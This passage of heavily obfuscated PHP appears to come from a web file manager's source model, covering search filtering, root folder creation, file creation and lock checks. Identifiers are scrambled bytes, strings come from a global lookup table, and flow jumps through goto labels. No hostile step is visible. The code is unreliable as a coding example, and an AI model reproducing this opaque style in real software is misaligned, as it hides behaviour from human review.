$C¿Çó¶ÓÃß[33], $C¿Çó¶ÓÃß[75]); $C©¤çæ›Ì = array_unique($C¢ÍŞµ¹Ü); $this->_listSearchMerge($aôµŒˆÉ¸ù, $b¬¸–¾ˆ, $B¿…“²‡„Ö, $C©¤çæ›Ì); goto DÔ«‚¯ÂŞ‰; BÃ¸™õÆÇ: $C¿Çó¶ÓÃß =& $_SERVER[»„]; if (!$b¬¸–¾ˆ[$C¿Çó¶ÓÃß[2148]] || $aôµŒˆÉ¸ù[$C¿Çó¶ÓÃß[347]][$C¿Çó¶ÓÃß[336]] > 1) { return; } $BŠç»Œ – = Model($C¿Çó¶ÓÃß[2280])->listData(); goto B²ê‰†ãˆ; DÔ«‚¯ÂŞ‰: } private function _listSearchDesc(&$AÀ­»°İáÑ, $AÏ‘²í‡ÕÛ, $CÖ‚Õ‘Œ’) { goto eïÕšÂ’†£; f“ºÓ­¢İ¡: $CôáÎÙ‰–À = Model($E“ñ›É¯‰í[500])->field($E“ñ›É¯‰í[365])->where($B±©”‚ÛõÑ)->select(); $f™ô®Ä®Æï = array_to_keyvalue($CôáÎÙ‰–À, $E“ñ›É¯‰í[33], $E“ñ›É¯‰í[365]); $this->_listSearchMerge($AÀ­»°İáÑ, $AÏ‘²í‡ÕÛ, $CÖ‚Õ‘Œ’, $f™ô®Ä®Æï); goto DÅ¾®¿ É; eïÕšÂ’†£: $E“ñ›É¯‰í =& $_SERVER[»„]; if (!$AÏ‘²í‡ÕÛ[$E“ñ›É¯‰í[2148]] || $AÀ­»°İáÑ[$E“ñ›É¯‰í[347]][$E“ñ›É¯‰í[336]] > 1) { return; } $fÁÔšÙà×õ = $this->listSearchChildren($AÏ‘²í‡ÕÛ[$E“ñ›É¯‰í[457]]); goto C ù·ÚÌÏÎ; C ù·ÚÌÏÎ: $fÁÔšÙà×õ = array_unique($fÁÔšÙà×õ); if (!$fÁÔšÙà×õ) { return; } $B±©”‚ÛõÑ = array($E“ñ›É¯‰í[365] => array($E“ñ›É¯‰í[7], $fÁÔšÙà×õ), $E“ñ›É¯‰í[89] => $E“ñ›É¯‰í[401], $E“ñ›É¯‰í[355] => array($E“ñ›É¯‰í[739], $E“ñ›É¯‰í[2150] . $AÏ‘²í‡ÕÛ[$E“ñ›É¯‰í[2148]] . $E“ñ›É¯‰í[2150])); goto f“ºÓ­¢İ¡; DÅ¾®¿ É: } private function _listSearchMerge(&$C„‰²½‹ç«, $Då‹©–À×Ü, $DÔÒÙì˜Ç, $Bë«æçŒ¢–) { goto F¹½öÏ‡²; b£Õ˜ÍÌé: foreach ($b¹ïôÚï¯˜ as $f“˜ØâÑ•) { $FÄì„ã±÷Ú = $B÷ï¶Åøç´[47] . $Då‹©–À×Ü[$B÷ï¶Åøç´[457]] . $B÷ï¶Åøç´[47]; if (stripos($f“˜ØâÑ•[$B÷ï¶Åøç´[455]], $FÄì„ã±÷Ú) !== !1) { $DÙ„ùŒ¶™[] = $f“˜ØâÑ•; } } $C„‰²½‹ç«[$B÷ï¶Åøç´[350]] = array_merge($DÙ„ùŒ¶™, $C„‰²½‹ç«[$B÷ï¶Åøç´[350]]); $C„‰²½‹ç«[$B÷ï¶Åøç´[347]][$B÷ï¶Åøç´[348]] += count($DÙ„ùŒ¶™); goto Aã–¸ï¡ˆ­; BÖÖ†ÊÊò: $B®³Œƒæ = array_diff($Bë«æçŒ¢–, $dà…È¾ˆ»); if (!$B®³Œƒæ) { return; } $aç‡‡˜àÅ = array($B÷ï¶Åøç´[365] => array($B÷ï¶Åøç´[7], $B®³Œƒæ)); goto d¨¯”š÷; F¹½öÏ‡²: $B÷ï¶Åøç´ =& $_SERVER[»„]; if (!$Bë«æçŒ¢–) { return; } $dà…È¾ˆ» = array_to_keyvalue($C„‰²½‹ç«[$B÷ï¶Åøç´[350]], $B÷ï¶Åøç´[33], $B÷ï¶Åøç´[365]); goto BÖÖ†ÊÊò; d¨¯”š÷: $b¹ïôÚï¯˜ = $this->field($DÔÒÙì˜Ç)->where($aç‡‡˜àÅ)->select(); if (!$b¹ïôÚï¯˜) { return; } $DÙ„ùŒ¶™ = array(); goto b£Õ˜ÍÌé; Aã–¸ï¡ˆ­: } public function listSearchChildren($Bªç†–¼†Ï, $a§íé ªÄï = 5000) { goto E¿Õñš±Û; E¿Õñš±Û: $e™¬°ÛÆİ‘ =& $_SERVER[»„]; $d·ÕÃØ½¢ = array(); $D¥©†¸˜ = $this->sourceInfo($Bªç†–¼†Ï); goto cö§‹Ö“Í; Dî±ÓèêÏ: $cÕªõ•†Ô® = $this->field($e™¬°ÛÆİ‘[365])->where($f¨ºèÎÄ‘‚)->select(); $d·ÕÃØ½¢ = array_to_keyvalue($cÕªõ•†Ô®, $e™¬°ÛÆİ‘[33], $e™¬°ÛÆİ‘[365]); return $d·ÕÃØ½¢; goto a“é®‡‘äê; cö§‹Ö“Í: $f¨ºèÎÄ‘‚ = array($e™¬°ÛÆİ‘[455] => array($e™¬°ÛÆİ‘[739], $D¥©†¸˜[$e™¬°ÛÆİ‘[455]] . $D¥©†¸˜[$e™¬°ÛÆİ‘[365]] . $e™¬°ÛÆİ‘[480])); $DŠîöç”Ú = $this->field($e™¬°ÛÆİ‘[365])->cache(null, 600)->where($f¨ºèÎÄ‘‚)->count(); if ($DŠîöç”Ú > $a§íé ªÄï) { return $this->_listSearchChildrenNear($Bªç†–¼†Ï, $a§íé ªÄï); } goto Dî±ÓèêÏ; a“é®‡‘äê: } private function _listSearchChildrenNear($FñôÔõçÎÍ, $B„²™µ‡ˆ) { goto a‰‹÷Ÿ¹ì±; D„ÓÒÏ‹: if (!$f±ñ¡®¾°) { return $e…Ú»³µ‡; } $EÜ¨ø®ÕµÆ = array($DÏ¯¤‘—ì[457] => array($DÏ¯¤‘—ì[7], $f±ñ¡®¾°)); $B¤¢ˆÑ£Ø = $this->field($DÏ¯¤‘—ì[2281])->where($EÜ¨ø®ÕµÆ)->select(); goto bÕãÎ´œ…‚; a‰‹÷Ÿ¹ì±: $DÏ¯¤‘—ì =& $_SERVER[»„]; $e…Ú»³µ‡ = array(); $EÜ¨ø®ÕµÆ = array($DÏ¯¤‘—ì[457] => $FñôÔõçÎÍ); goto F¢ÆªÉë‡Ê; bÕãÎ´œ…‚: $e…Ú»³µ‡ = array_merge($e…Ú»³µ‡, array_to_keyvalue($B¤¢ˆÑ£Ø, $DÏ¯¤‘—ì[33], $DÏ¯¤‘—ì[365])); $e…Ú»³µ‡ = array_slice($e…Ú»³µ‡, 0, $B„²™µ‡ˆ); return $e…Ú»³µ‡; goto eÌ†îÒï‘¬; F¢ÆªÉë‡Ê: $B¤¢ˆÑ£Ø = $this->field($DÏ¯¤‘—ì[2281])->where($EÜ¨ø®ÕµÆ)->select(); $f±ñ¡®¾° = array_to_keyvalue(array_filter_by_field($B¤¢ˆÑ£Ø, $DÏ¯¤‘—ì[366], $DÏ¯¤‘—ì[83]), $DÏ¯¤‘—ì[33], $DÏ¯¤‘—ì[365]); $e…Ú»³µ‡ = array_merge($e…Ú»³µ‡, array_to_keyvalue($B¤¢ˆÑ£Ø, $DÏ¯¤‘—ì[33], $DÏ¯¤‘—ì[365])); goto D„ÓÒÏ‹; eÌ†îÒï‘¬: } private function _listSearchBindPinyin($A«À¨¹ˆø­, &$C¸‰®ó­¼, &$Eµ¤¸ÑŸ´ê) { goto Cù„‡İ’™Á; Cù„‡İ’™Á: $D‚šƒõ¶½Â =& $_SERVER[»„]; if (!Input::check($A«À¨¹ˆø­[$D‚šƒõ¶½Â[2148]], $D‚šƒõ¶½Â[302]) || strlen($A«À¨¹ˆø­[$D‚šƒõ¶½Â[2148]]) < 2) { return; } $eô›ï‰Ö½ö = "\x4c\105\106\124\x20\x4a\117\x49\116\40{$this->tablePrefix}\x69\x6f\137\163\157\165\x72\143\145\137\x6d\x65\x74\141\x20\155\x65\x74\141\40\x6f\x6e\x20\x73\x6f\165\162\x63\x65\x2e\x73\157\x75\162\x63\x65\111\104\x20\x3d\x20\155\145\164\141\x2e\x73\x6f\x75\162\x63\145\111\x44"; goto e’”ßÍõŸÑ; e’”ßÍõŸÑ: $eÓø™äÓ›¯ = array(); $Eµ¤¸ÑŸ´ê = str_replace(array($D‚šƒõ¶½Â[213], $D‚šƒõ¶½Â[50], $D‚šƒõ¶½Â[2282]), $D‚šƒõ¶½Â[33], $Eµ¤¸ÑŸ´ê); $Eµ¤¸ÑŸ´ê = $D‚šƒõ¶½Â[2283] . str_replace($D‚šƒõ¶½Â[47], $D‚šƒõ¶½Â[2284], $Eµ¤¸ÑŸ´ê); goto aù¨›Ê‚Åù; aù¨›Ê‚Åù: unset($C¸‰®ó­¼[$D‚šƒõ¶½Â[28]]); foreach ($C¸‰®ó­¼ as $bˆöĞ®—Æ => $A‡Š„Ë­ÙÚ) { $eÓø™äÓ›¯[$D‚šƒõ¶½Â[2283] . $bˆöĞ®—Æ] = $A‡Š„Ë­ÙÚ; } $DÅ÷´› = array($D‚šƒõ¶½Â[479], $D‚šƒõ¶½Â[2150] . $A«À¨¹ˆø­[$D‚šƒõ¶½Â[2148]] . $D‚šƒõ¶½Â[2150]); goto bå®øœãö“; bå®øœãö“: $eÓø™äÓ›¯[] = array($D‚šƒõ¶½Â[2285] => $DÅ÷´›, $D‚šƒõ¶½Â[904] => $D‚šƒõ¶½Â[2152], array($D‚šƒõ¶½Â[2286] => $DÅ÷´›, $D‚šƒõ¶½Â[2287] => array($D‚šƒõ¶½Â[7], array($D‚šƒõ¶½Â[412], $D‚šƒõ¶½Â[411])))); $this->join($eô›ï‰Ö½ö); $C¸‰®ó­¼ = $eÓø™äÓ›¯; goto AÁë•ÕµĞâ; AÁë•ÕµĞâ: } private function _parseSearchWhere($bØ®¢º…¥Õ) { goto døáç•ñÊ; Fò³ğŞ†á: if (isset($bØ®¢º…¥Õ[$fË¦Ãê”¨[531]])) { $fï¦ñòÃ…•[] = array($fË¦Ãê”¨[375] => $bØ®¢º…¥Õ[$fË¦Ãê”¨[531]], $fË¦Ãê”¨[374] => $bØ®¢º…¥Õ[$fË¦Ãê”¨[531]], $fË¦Ãê”¨[904] => $fË¦Ãê”¨[2152]); } if (isset($bØ®¢º…¥Õ[$fË¦Ãê”¨[368]])) { $Bë¬Ï¿¹‹ = $bØ®¢º…¥Õ[$fË¦Ãê”¨[368]]; if ($Bë¬Ï¿¹‹ == $fË¦Ãê”¨[76]) { $fï¦ñòÃ…•[$fË¦Ãê”¨[366]] = 1; } else { if ($Bë¬Ï¿¹‹ == $fË¦Ãê”¨[2293]) { $fï¦ñòÃ…•[$fË¦Ãê”¨[366]] = 0; } else { if ($Bë¬Ï¿¹‹) { $Bë¬Ï¿¹‹ = is_array($Bë¬Ï¿¹‹) ? $Bë¬Ï¿¹‹ : explode($fË¦Ãê”¨[47], $Bë¬Ï¿¹‹); $fï¦ñòÃ…•[$fË¦Ãê”¨[368]] = array($fË¦Ãê”¨[380], $Bë¬Ï¿¹‹); $fï¦ñòÃ…•[$fË¦Ãê”¨[366]] = 0; } } } } if (isset($bØ®¢º…¥Õ[$fË¦Ãê”¨[457]])) { $a¤‡…Ê§’ = $this->sourceInfo($bØ®¢º…¥Õ[$fË¦Ãê”¨[457]]); $fï¦ñòÃ…•[$fË¦Ãê”¨[521]] = array($fË¦Ãê”¨[479], $a¤‡…Ê§’[$fË¦Ãê”¨[455]] . $bØ®¢º…¥Õ[$fË¦Ãê”¨[457]] . $fË¦Ãê”¨[480]); } goto eÕ¬å”¢ç•; eÕ¬å”¢ç•: if (isset($bØ®¢º…¥Õ[$fË¦Ãê”¨[2148]]) && $bØ®¢º…¥Õ[$fË¦Ãê”¨[2148]]) { $BÅÁ¥ÉœÚ = $bØ®¢º…¥Õ[$fË¦Ãê”¨[2148]]; $Aèñ“ªöÁË = explode($fË¦Ãê”¨[50], $BÅÁ¥ÉœÚ); if (strlen($BÅÁ¥ÉœÚ) > 2 && (substr($BÅÁ¥ÉœÚ, 0, 1) == $fË¦Ãê”¨[112] && substr($BÅÁ¥ÉœÚ, -1) == $fË¦Ãê”¨[112]) || substr($BÅÁ¥ÉœÚ, 0, 1) == $fË¦Ãê”¨[55] && substr($BÅÁ¥ÉœÚ, -1) == $fË¦Ãê”¨[55]) { $BÅÁ¥ÉœÚ = substr($BÅÁ¥ÉœÚ, 1, -1); $Aèñ“ªöÁË = array($BÅÁ¥ÉœÚ); } $fï¦ñòÃ…•[$fË¦Ãê”¨[28]] = array($fË¦Ãê”¨[479], $fË¦Ãê”¨[2150] . $BÅÁ¥ÉœÚ . $fË¦Ãê”¨[2150]); if (count($Aèñ“ªöÁË) > 1) { $fï¦ñòÃ…•[$fË¦Ãê”¨[28]] = array(); foreach ($Aèñ“ªöÁË as $D³â´‚¨’ô) { if (!trim($D³â´‚¨’ô)) { continue; } $fï¦ñòÃ…•[$fË¦Ãê”¨[28]][] = array($fË¦Ãê”¨[479], $fË¦Ãê”¨[2150] . trim($D³â´‚¨’ô) . $fË¦Ãê”¨[2150]); } } } return $fï¦ñòÃ…•; goto AàñÑ¤¬õ; a¾¹‹øöÃ: if (isset($bØ®¢º…¥Õ[$fË¦Ãê”¨[691]])) { $eÌˆ”©å¤ = array($fË¦Ãê”¨[2289], $bØ®¢º…¥Õ[$fË¦Ãê”¨[691]]); if ($fï¦ñòÃ…•[$fË¦Ãê”¨[106]]) { $fï¦ñòÃ…•[$fË¦Ãê”¨[106]] = array($fï¦ñòÃ…•[$fË¦Ãê”¨[106]], $eÌˆ”©å¤, $fË¦Ãê”¨[2290]); } else { $fï¦ñòÃ…•[$fË¦Ãê”¨[106]] = $eÌˆ”©å¤; } } if (isset($bØ®¢º…¥Õ[$fË¦Ãê”¨[2291]])) { $fï¦ñòÃ…•[$fË¦Ãê”¨[77]] = array($fË¦Ãê”¨[2288], $bØ®¢º…¥Õ[$fË¦Ãê”¨[2291]]); } if (isset($bØ®¢º…¥Õ[$fË¦Ãê”¨[2292]])) { $eÌˆ”©å¤ = array($fË¦Ãê”¨[2289], $bØ®¢º…¥Õ[$fË¦Ãê”¨[2292]]); if ($fï¦ñòÃ…•[$fË¦Ãê”¨[77]]) { $fï¦ñòÃ…•[$fË¦Ãê”¨[77]] = array($fï¦ñòÃ…•[$fË¦Ãê”¨[77]], $eÌˆ”©å¤, $fË¦Ãê”¨[2290]); } else { $fï¦ñòÃ…•[$fË¦Ãê”¨[77]] = $eÌˆ”©å¤; } } goto Fò³ğŞ†á; døáç•ñÊ: $fË¦Ãê”¨ =& $_SERVER[»„]; $fï¦ñòÃ…• = array(); if (isset($bØ®¢º…¥Õ[$fË¦Ãê”¨[690]])) { $fï¦ñòÃ…•[$fË¦Ãê”¨[106]] = array($fË¦Ãê”¨[2288], $bØ®¢º…¥Õ[$fË¦Ãê”¨[690]]); } goto a¾¹‹øöÃ; AàñÑ¤¬õ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($BÙª«°Ê´¬) { $AùŠÙğÉ½ =& $_SERVER[»„]; $A–ƒğâ¾È = Model($AùŠÙğÉ½[470])->where(array($AùŠÙğÉ½[1400] => $BÙª«°Ê´¬))->find(); $AÑ˜í´¬‘Œ = $this->_mkdirRoot(SourceModel::TYPE_USER, $BÙª«°Ê´¬, $A–ƒğâ¾È[$AùŠÙğÉ½[28]]); $this->userDesktopAdd($AÑ˜í´¬‘Œ); return $AÑ˜í´¬‘Œ; } public function userDesktopAdd($Bäƒ³Áù›) { $fÀ¦™¾áÔˆ =& $_SERVER[»„]; $e¡‰ó”ï»Œ = LNG($fÀ¦™¾áÔˆ[2294]); $d¥Í±øòñ = $this->mkdir($Bäƒ³Áù›, $e¡‰ó”ï»Œ); $this->metaSet($d¥Í±øòñ, $fÀ¦™¾áÔˆ[2295], $fÀ¦™¾áÔˆ[83]); $this->metaSet($Bäƒ³Áù›, $fÀ¦™¾áÔˆ[2296], $d¥Í±øòñ); } public function groupRootAdd($E¢ÀÊŸ„…) { $DŒñ¬·ä¯ =& $_SERVER[»„]; $e…‡ïµ˜âí = Model($DŒñ¬·ä¯[454])->where(array($DŒñ¬·ä¯[2144] => $E¢ÀÊŸ„…))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $E¢ÀÊŸ„…, $e…‡ïµ˜âí[$DŒñ¬·ä¯[28]]); } public function systemRootPathAdd($bŒ±‰ÌõŠ) { if ($bŒ±‰ÌõŠ != $_SERVER[»„][1077]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $bŒ±‰ÌõŠ); } public function userRootRemove($c“Š‹®Æ®å) { $fç¾……áÎ§ = $this->sourceRoot(SourceModel::TYPE_USER, $c“Š‹®Æ®å); if (!$fç¾……áÎ§) { return; } $this->remove($fç¾……áÎ§, !1); } public function groupRootRemove($B¶›¬ªÇÕ) { $CÀƒ¿áÆïğ = $this->sourceRoot(SourceModel::TYPE_GROUP, $B¶›¬ªÇÕ); if (!$CÀƒ¿áÆïğ) { return; } $this->remove($CÀƒ¿áÆïğ, !1); } private function _mkdirRoot($eÓÜÆ»¾Æ, $aëÙã„ĞÉè, $BíÎ´±•ò’) { goto FºãšñóÛº; D™ùº’¡ùÃ: $EæĞóèµ¨¢ = $this->add($Cğ©ˆ§‰); $bÒ²“²…Ì‘ = array($a³åùš±¬¨[523] => short_id($EæĞóèµ¨¢)); $this->where(array($a³åùš±¬¨[379] => $EæĞóèµ¨¢))->save($bÒ²“²…Ì‘); goto B“¸Â†ß×à; FºãšñóÛº: $a³åùš±¬¨ =& $_SERVER[»„]; $Cğ©ˆ§‰ = array($a³åùš±¬¨[364] => 0, $a³åùš±¬¨[517] => $eÓÜÆ»¾Æ, $a³åùš±¬¨[518] => $aëÙã„ĞÉè, $a³åùš±¬¨[514] => 1, $a³åùš±¬¨[519] => USER_ID, $a³åùš±¬¨[520] => USER_ID, $a³åùš±¬¨[515] => $a³åùš±¬¨[33], $a³åùš±¬¨[521] => $a³åùš±¬¨[466], $a³åùš±¬¨[392] => 0, $a³åùš±¬¨[516] => 0, $a³åùš±¬¨[416] => 0, $a³åùš±¬¨[522] => $a³åùš±¬¨[33]); if ($fŒ˜Ïâ¡ğ = $this->where($Cğ©ˆ§‰)->find()) { return $fŒ˜Ïâ¡ğ[$a³åùš±¬¨[365]]; } goto fğÓ…¦¢¦‹; fğÓ…¦¢¦‹: $aËø¾Å¥¹Á = "\x4d\x6f\144\x65\x6c\x53\157\x75\162\x63\x65\x2e\x6d\153\x64\x69\x72\122\157\x6f\164\x2e{$eÓÜÆ»¾Æ}\56{$aëÙã„ĞÉè}\56" . $BíÎ´±•ò’; CacheLock::lock($aËø¾Å¥¹Á); $Cğ©ˆ§‰[$a³åùš±¬¨[28]] = $BíÎ´±•ò’; goto D™ùº’¡ùÃ; B“¸Â†ß×à: CacheLock::unlock($aËø¾Å¥¹Á); return $EæĞóèµ¨¢; goto e÷„­›©; e÷„­›©: } private function sourceRoot($Fï²ööğ“, $D…çĞ›‚ø½, $e‹»Èé…†ø = false) { $f‘àÈ…Äö =& $_SERVER[»„]; $C›ëì£«ä‡ = array($f‘àÈ…Äö[364] => 0, $f‘àÈ…Äö[517] => $Fï²ööğ“, $f‘àÈ…Äö[518] => $D…çĞ›‚ø½); if ($fŒÖ–¡ŠÙê = $this->where($C›ëì£«ä‡)->find()) { return $e‹»Èé…†ø ? $fŒÖ–¡ŠÙê : $fŒÖ–¡ŠÙê[$f‘àÈ…Äö[365]]; } return !1; } public function sourceRootGroup($eµƒÑËïñ”) { $C‡ØùÜŸ =& $_SERVER[»„]; if (is_string($eµƒÑËïñ”)) { $eµƒÑËïñ” = array($eµƒÑËïñ”); } $F¾‘Ş²¿³Œ = array($C‡ØùÜŸ[364] => 0, $C‡ØùÜŸ[517] => SourceModel::TYPE_GROUP, $C‡ØùÜŸ[518] => array($C‡ØùÜŸ[7], $eµƒÑËïñ”)); $CßíÉŠ¤º˜ = $this->listSource($F¾‘Ş²¿³Œ, 1000); return array_to_keyvalue($CßíÉŠ¤º˜[$C‡ØùÜŸ[74]], $C‡ØùÜŸ[452]); } public function mkfile($b÷í³Î¤¿, $e‚¦÷¤…è, $a¦óõßµœÀ = '', $CÙ·‹”ŠÄ = REPEAT_RENAME) { $C·ƒó’÷øß =& $_SERVER[»„]; $a¿¥îÄ¹† = Model($C·ƒó’÷øß[540])->addFileByContent($a¦óõßµœÀ, $e‚¦÷¤…è); return $this->_createFileCall($b÷í³Î¤¿, $e‚¦÷¤…è, $a¿¥îÄ¹†, $CÙ·‹”ŠÄ, $C·ƒó’÷øß[1106]); } public function addFile($f™ÉÀ«Šé, $DÃè‰Ú·, $b·—…òĞ±ƒ, $b¾–ÇŒÕ™ = false, $D“Ÿá™ÑÜ˜ = REPEAT_RENAME) { $Aà„ø¹Ç£ = Model($_SERVER[»„][540])->addFile($DÃè‰Ú·, $b·—…òĞ±ƒ, $b¾–ÇŒÕ™); return $this->_createFileCall($f™ÉÀ«Šé, $b·—…òĞ±ƒ, $Aà„ø¹Ç£, $D“Ÿá™ÑÜ˜); } public function addFileByFileID($cËàå°Ù¸·, $e²îóºÑˆ, $eÏÑ™¿êà, $Bîîê¶»ä = REPEAT_RENAME) { $dÌ‚ù§ÊÌ =& $_SERVER[»„]; $CöçŠŠÔÆ = Model($dÌ‚ù§ÊÌ[540])->find($e²îóºÑˆ); Model($dÌ‚ù§ÊÌ[540])->linkAdd($e²îóºÑˆ); return $this->_createFileCall($cËàå°Ù¸·, $eÏÑ™¿êà, $CöçŠŠÔÆ, $Bîîê¶»ä); } public function addFileByRemote($dÑöÌ šèİ, $a¢¶´²Éæ£, $f¦‡Ù• á, $EäÌÏ•›ĞÔ = array(), $bç·éŒÀ©¹ = REPEAT_RENAME) { $E«Ù„„µ¦ï = Model($_SERVER[»„][540])->addFileByRemote($a¢¶´²Éæ£, $f¦‡Ù• á, $EäÌÏ•›ĞÔ); return $this->_createFileCall($dÑöÌ šèİ, $f¦‡Ù• á, $E«Ù„„µ¦ï, $bç·éŒÀ©¹); } private function _createFileCall($FØÄ÷õŒŞ, $b£°ºùÖò, $aŞ‰ŠŞŞ™…, $eØŸ»ÍÇòÛ, $FóÎí¨¸ÕÇ = "\x75\160\x6c\x6f\141\144") { goto eñİ˜ÀÎ®ä; eğÏ è¬ˆ: return $DåÔÍ¡¸ƒ; goto Fâ–’§ìÈ; E¶øêˆÇÏ : $DåÔÍ¡¸ƒ = $this->_createFile($FØÄ÷õŒŞ, $b£°ºùÖò, $aŞ‰ŠŞŞ™…, $eØŸ»ÍÇòÛ, $FÛ¯‘÷¶); if (!$FÛ¯‘÷¶) { Model($AÑƒÕÔ³öõ[418])->remove($aŞ‰ŠŞŞ™…[$AÑƒÕÔ³öõ[415]]); } else { if ($DåÔÍ¡¸ƒ) { Model($AÑƒÕÔ³öõ[2267])->eventCreate($DåÔÍ¡¸ƒ, $FóÎí¨¸ÕÇ); } } $this->lockWriteEnd($FØÄ÷õŒŞ, $b£°ºùÖò); goto eğÏ è¬ˆ; eñİ˜ÀÎ®ä: $AÑƒÕÔ³öõ =& $_SERVER[»„]; $FÛ¯‘÷¶ = !1; $this->lockWriteStart($FØÄ÷õŒŞ, $b£°ºùÖò); goto E¶øêˆÇÏ ; Fâ–’§ìÈ: } public function mkdir($a»“±½Ë¼, $e›Ê®¡¢¶, $BÚ¡Öåô˜ğ = REPEAT_SKIP) { goto F¾İ²ªÍ©½; dœÇ¤ÓÉ°Ä: $Ağ³´‚‘ª = $this->_addSoure($BšÏÜ‚ìï‹, $FÁèìá–ë); Model($B»šöê‘Ç˜[2267])->eventCreate($Ağ³´‚‘ª, $B»šöê‘Ç˜[1107]); $this->lockWriteEnd($a»“±½Ë¼, $e›Ê®¡¢¶); goto C¦ç¢õÚ¼„; F¾İ²ªÍ©½: $B»šöê‘Ç˜ =& $_SERVER[»„]; $FÁèìá–ë = $this->sourceInfo($a»“±½Ë¼); if (!$FÁèìá–ë) { return !1; } goto f¾•¹–Ì¥¥; f¾•¹–Ì¥¥: $this->lockWriteStart($a»“±½Ë¼, $e›Ê®¡¢¶); if ($BÚ¡Öåô˜ğ !== !1) { $Eèô»¥¡¬‹ = $this->fileNameExist($a»“±½Ë¼, $e›Ê®¡¢¶); if ($Eèô»¥¡¬‹ && $BÚ¡Öåô˜ğ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($a»“±½Ë¼, $e›Ê®¡¢¶); return $Eèô»¥¡¬‹; } $e›Ê®¡¢¶ = $this->fileNameAuto($a»“±½Ë¼, $e›Ê®¡¢¶, $BÚ¡Öåô˜ğ); } $BšÏÜ‚ìï‹ = array($B»šöê‘Ç˜[514] => 1, $B»šöê‘Ç˜[382] => $e›Ê®¡¢¶, $B»šöê‘Ç˜[515] => $B»šöê‘Ç˜[33], $B»šöê‘Ç˜[416] => 0, $B»šöê‘Ç˜[516] => 0); goto dœÇ¤ÓÉ°Ä; C¦ç¢õÚ¼„: return $Ağ³´‚‘ª; goto Cõßóßë”; Cõßóßë”: } private function _createFile($DÌøĞõŠ, $FÏ³àªˆ´º, $dÆ÷÷¢„³‹, $fÛÉïá—¥, &$B¯íÄæÄš—) { goto AÓ‘¶ø÷Ç·; C„âšÎöê«: if ($fÛÉïá—¥ !== !1) { $DË›°ò¢Ú‡ = $this->fileNameExist($DÌøĞõŠ, $FÏ³àªˆ´º); } $B¯íÄæÄš— = !0; if ($fÛÉïá—¥ && $DË›°ò¢Ú‡) { if ($fÛÉïá—¥ == REPEAT_SKIP) { $B¯íÄæÄš— = !1; return $DË›°ò¢Ú‡; } else { if ($fÛÉïá—¥ == REPEAT_REPLACE) { $B¾ò»Òï = $this->sourceInfo($DË›°ò¢Ú‡); $D¶Û¢­Ñ…Ã = $this->fileHistory($B¾ò»Òï, $dÆ÷÷¢„³‹[$aÄ›çÛÒ×¸[415]], $dÆ÷÷¢„³‹[$aÄ›çÛÒ×¸[77]]); if (!$D¶Û¢­Ñ…Ã) { $B¯íÄæÄš— = !1; } else { $this->folderSizeReset($DÌøĞõŠ); } return $DË›°ò¢Ú‡; } else { $FÏ³àªˆ´º = $this->fileNameAuto($DÌøĞõŠ, $FÏ³àªˆ´º, $fÛÉïá—¥, !1); } } } goto aÀïÄ¿–¿; AÓ‘¶ø÷Ç·: $aÄ›çÛÒ×¸ =& $_SERVER[»„]; $a‡Ë«Õ¤‘ï = $this->sourceInfo($DÌøĞõŠ); if (!$dÆ÷÷¢„³‹ || !$a‡Ë«Õ¤‘ï) { return !1; } goto C„âšÎöê«; aÀïÄ¿–¿: $E«“·²Óğğ = array($aÄ›çÛÒ×¸[514] => 0, $aÄ›çÛÒ×¸[382] => $FÏ³àªˆ´º, $aÄ›çÛÒ×¸[515] => get_path_ext($FÏ³àªˆ´º), $aÄ›çÛÒ×¸[416] => $dÆ÷÷¢„³‹[$aÄ›çÛÒ×¸[415]], $aÄ›çÛÒ×¸[516] => $dÆ÷÷¢„³‹[$aÄ›çÛÒ×¸[77]]); $CÙ§­Ü… = $this->_addSoure($E«“·²Óğğ, $a‡Ë«Õ¤‘ï); $this->folderSizeReset($DÌøĞõŠ); goto CêÍ«ª¡õ; CêÍ«ª¡õ: return $CÙ§­Ü…; goto f…Ö‚ÉŞ·‰; f…Ö‚ÉŞ·‰: } protected function fileHistory($A„ŒÒİóà³, $f”ÂñÜŸÃ, $DŒ‡«¢ÁãŞ) { goto aÍ„ã¥ªœê; CäóîŒ©Ğ¡: Model($Cç»Ì¸æ¢[2297])->addHistory($A„ŒÒİóà³); $Fº¹´¬ÖÎ = array($Cç»Ì¸æ¢[520] => USER_ID, $Cç»Ì¸æ¢[386] => time(), $Cç»Ì¸æ¢[415] => $f”ÂñÜŸÃ, $Cç»Ì¸æ¢[77] => $DŒ‡«¢ÁãŞ); $this->where(array($Cç»Ì¸æ¢[379] => $A„ŒÒİóà³[$Cç»Ì¸æ¢[365]]))->save($Fº¹´¬ÖÎ); goto CáøíÍóï; aÍ„ã¥ªœê: $Cç»Ì¸æ¢ =& $_SERVER[»„]; if ($A„ŒÒİóà³[$Cç»Ì¸æ¢[415]] == $f”ÂñÜŸÃ) { return !1; } $this->checkLock($A„ŒÒİóà³[$Cç»Ì¸æ¢[365]], $f”ÂñÜŸÃ); goto CäóîŒ©Ğ¡; CáøíÍóï: return !0; goto d¥õÁÃäöŠ; d¥õÁÃäöŠ: } public function checkLock($c¬ç´µÎˆÇ, $f ¿¿ğ£¤ë) { goto DĞ——ßÃª‘; DÁ˜‡·°ˆ: show_json(LNG($b°¾Ë¯‹‡ô[2300]) . $b°¾Ë¯‹‡ô[2301] . LNG($b°¾Ë¯‹‡ô[2302]) . $b°¾Ë¯‹‡ô[2303] . $c÷®‹Äâ• . $b°¾Ë¯‹‡ô[2304], !1); goto c½‚ÅºôâÚ; DĞ——ßÃª‘: $b°¾Ë¯‹‡ô =& $_SERVER[»„]; $dóíÍ®ãöÑ = $this->pathInfo($c¬ç´µÎˆÇ); if (!$this->fileIsLock($dóíÍ®ãöÑ, !0)) { return; } goto eÌÏ™Ë„œŒ; eÌÏ™Ë„œŒ: $d¤•™‚†¾ = Session::get($b°¾Ë¯‹‡ô[2298]); $C¯Ÿ­ˆ…´³ = substr($dóíÍ®ãöÑ[$b°¾Ë¯‹‡ô[28]], 0, -1 - strlen($dóíÍ®ãöÑ[$b°¾Ë¯‹‡ô[156]])) . $b°¾Ë¯‹‡ô[1362] . $d¤•™‚†¾ . $b°¾Ë¯‹‡ô[91] . $dóíÍ®ãöÑ[$b°¾Ë¯‹‡ô[156]]; $BâÒ¡µùÏ½ = Model($b°¾Ë¯‹‡ô[540])->find($f ¿¿ğ£¤ë); goto bŒ«ÏÒ¯“Ô; 